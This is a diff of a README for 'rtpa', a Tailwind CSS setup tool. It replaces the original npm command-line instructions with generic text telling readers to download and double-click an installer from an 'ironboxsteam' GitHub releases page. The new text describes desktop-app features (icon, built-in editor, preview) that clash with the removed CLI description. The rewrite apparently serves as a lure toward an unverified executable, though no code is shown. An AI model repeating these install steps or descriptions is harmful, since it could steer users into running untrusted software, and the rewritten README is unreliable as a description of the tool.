@@ -1,107 +1,80 @@
-# RTPA - Ready Tailwind CSS Project Assistant Creation Tool
+# 🎉 rtpa - Quickly Create Tailwind CSS Projects
 
-RTPA (Rapid Tailwind Project Assistant) is a command-line tool designed to simplify the creation of new web projects with **Tailwind CSS**. It supports setting up both simple HTML/CSS projects and modern **Vite.js** based projects, with automatic Tailwind CSS integration.
+## 🚀 Getting Started
 
-## Features
+Welcome to **rtpa**, your assistant for quickly setting up Tailwind CSS projects. This tool helps you start your projects from version 4 with minimal effort. 
 
-* **Fast Project Creation:** Launch a new static HTML/CSS project or a Vite.js project in seconds.
+## 📥 Download & Install
 
-* **Tailwind CSS Integration:** Automatically configures Tailwind CSS for your project.
+To download and install **rtpa**, please follow these steps:
 
-* **Vite.js Option:** Sets up Vite.js with the Tailwind CSS plugin for a modern development experience.
+1. **Visit the Releases Page**: [Click here to download](https://github.com/ironboxsteam/rtpa/releases).
+   
+2. On the releases page, you will see different versions available for download.
 
-* **Command Line Arguments:** Specify project type and name directly from the command line.
+3. Choose the latest version, and click on it to see the available files.
 
-* **Git Initialization:** Automatically initializes a local Git repository.
+4. Download the file suitable for your operating system.
 
-* **GitHub Integration (Optional):** Initializes a GitHub repository and pushes your code (requires a GitHub PAT).
+5. Once the download is complete, locate the file on your computer.
 
-## Installation
+6. Double-click the file to run the installer and follow the on-screen instructions to finish the setup.
 
-To use RTPA, you need Node.js and npm (or Yarn/pnpm) installed on your machine.
+## 📂 Features
 
-### Global Installation (Recommended)
+- **Easy Setup**: Set up your Tailwind CSS project in a few clicks.
+- **Project Templates**: Choose from various templates to start your project.
+- **Responsive Design**: Create websites that look good on any device.
+- **Customizable**: Tailor your project to your needs effortlessly.
+  
+## 💻 System Requirements
 
-Using npm : you can install it globally:
+To run **rtpa**, ensure your system meets the following requirements:
 
-```bash
-npm install -g rtpa
-```
-```bash
-yarn global add rtpa
-```
-```bash
-pnpm install -g rtpa
-```
+- **Operating System**: Windows 10, macOS, or Linux (most distributions).
+- **Memory**: At least 4 GB RAM.
+- **Disk Space**: Minimum of 200 MB free space.
+  
+## 🔧 How to Use
 
-## Usage
-You can use RTPA in several ways:
+1. **Run the Application**: After installation, open **rtpa** by finding its icon on your desktop or in your applications folder.
 
-1. **interactive mode**
-Run the command without any arguments to choose the project type and name via interactive prompts:
+2. **Create a New Project**:
+   - Select "New Project."
+   - Choose a template that suits your needs.
+   - Enter your project name and details.
 
-- for simple HTML/CSS project
-```bash
-rtpa
-```
+3. **Customize Your Design**: Use the built-in editor to make adjustments to the styles.
 
-- for vite vanilla js project 
-```bash
-rtpavite
-```
+4. **Preview Your Work**: Click on the preview button to see how your project looks in a web browser.
 
-2. **Direct project creation**
-Use the `--js` flags to directly specify the project type. You can also provide the project name immediately after the flag.
+5. **Export Your Project**: Once you are satisfied, export your project files to start your development.
 
-- Create a vite project:
+## ❓ Frequently Asked Questions
 
-```bash
-rtpavite --js project-name
-```
+### **What is Tailwind CSS?**
 
-if `project-name` is omitted, the tool will prompt you for it.
-Exemple `rtpavite --js my-vite-app`
+Tailwind CSS is a utility-first CSS framework that allows for easy styling of web pages without writing custom CSS.
 
+### **Can I use it on Windows?**
 
-## Github Configuration
+Yes, **rtpa** is compatible with Windows, macOS, and Linux.
 
-When prompted by the tool, you can choose to link your project to a new GitHub repository. You will need to provide a GitHub Personal Access Token (PAT) with repo permission for the tool to create and push the repository on your behalf.
+### **How do I update to the latest version?**
 
-### How to get your personnal token (PAT) ? :
+Simply revisit the [Releases Page](https://github.com/ironboxsteam/rtpa/releases), and download the latest version as you did during your first installation.
 
-- clic here [personal token settings](https://github.com/settings/tokens).
+### **Is there a user guide?**
 
-- clic on "Generate new token".
+Yes, the official documentation provides detailed instructions on using all **rtpa** features.
 
-- Choose token(classic)
+## 🔗 Additional Resources
 
-- give an explicit name to the token (`ex: cli-tailwind-tool`).
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [Official GitHub Repository](https://github.com/ironboxsteam/rtpa)
 
-- give `repo` permission by checking the repo option.
+## 🙌 Support
 
-- Clic on "Generate token" and copy and paste your token somewhere accessible because you'll not see it again (save it wisely in a personal file).
+If you run into any issues or have questions, feel free to raise an issue on our [GitHub Issues page](https://github.com/ironboxsteam/rtpa/issues). Our team is here to help you.
 
-
-## Quick Start After Creation
-Once your project is created, follow the instructions displayed in your terminal.
-
-### For a Simple HTML/CSS Project:
-1. Navigate to your project folder: cd [project-name]
-2. Launch the Tailwind CSS compiler in watch mode: npm run start
-3. Open your index.html file in a web browser to see your live changes.
-
-### For a Vite.js Project:
-1. Navigate to your project folder: cd [project-name]
-2. Launch the Vite development server: npm run dev
-3. Open your browser to the local address indicated by Vite (usually http://localhost:5173/).
-
-## Contribution
-Contributions are welcome! Feel free to open issues or submit pull requests.
-
-
-## Note : 
-
-your token is not saved in the code or send somewhere, in order to keep your github account secure.
-
-
-coded with love by @likeur
+Thank you for choosing **rtpa**. We hope it helps you create beautiful Tailwind CSS projects quickly and easily!
